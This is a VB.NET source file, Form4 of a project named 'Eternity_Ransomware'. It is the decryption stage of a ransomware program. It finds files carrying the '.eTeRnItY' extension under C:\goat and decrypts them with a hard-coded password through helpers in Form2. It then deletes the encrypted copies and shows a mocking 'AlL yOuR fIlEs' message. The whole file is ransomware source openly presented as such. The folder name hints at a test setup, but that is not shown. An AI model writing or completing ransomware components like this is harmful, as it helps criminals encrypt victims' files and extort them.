Imports Eternity_Ransomware.Form2

Public Class Form4

    Private Sub Form4_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        For Each foundFile As String In My.Computer.FileSystem.GetFiles(
           "C:\goat", FileIO.SearchOption.SearchAllSubDirectories)
            If foundFile.EndsWith(".eTeRnItY") Then
                ListBox1.Items.Add(foundFile)
            Else
            End If
        Next
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim filenamez As String
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            'My.Settings.DoneDecrypting = False
            MsgBox("AlL yOuR fIlEs HaVe BeEn SuCcEsSfUlLy DeCrYpTeD.", MsgBoxStyle.Information, "EnJoY")
            Application.ExitThread()


        Else

            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)

            Try
                'Declare variables for the key and iv.
                'The key needs to hold 256 bits and the iv 128 bits.
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                'Send the password to the CreateKey function.
                bytKey = Form2.CreateKey("sameeraperera")
                'Send the password to the CreateIV function.
                bytIV = Form2.CreateIV("sameeraperera")
                'Start the decryption.

                Dim withParts As String = "Books and Chapters and Pages"
                Dim filenamezu As String = Replace(filenamez, ".eTeRnItY", "")
                Form2.EncryptOrDecryptFile(filenamez, filenamezu, _
                                     bytKey, bytIV, CryptoAction.ActionDecrypt)
                My.Computer.FileSystem.DeleteFile(filenamez)

            Catch ex As Exception

            End Try

            ProgressBar1.Increment(1)
            Label2.Text = filenamez
            Label1.Text = "Decrypting Your Files....."
        End If

    End Sub

    Private Sub Label3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label3.Click

    End Sub
End Class
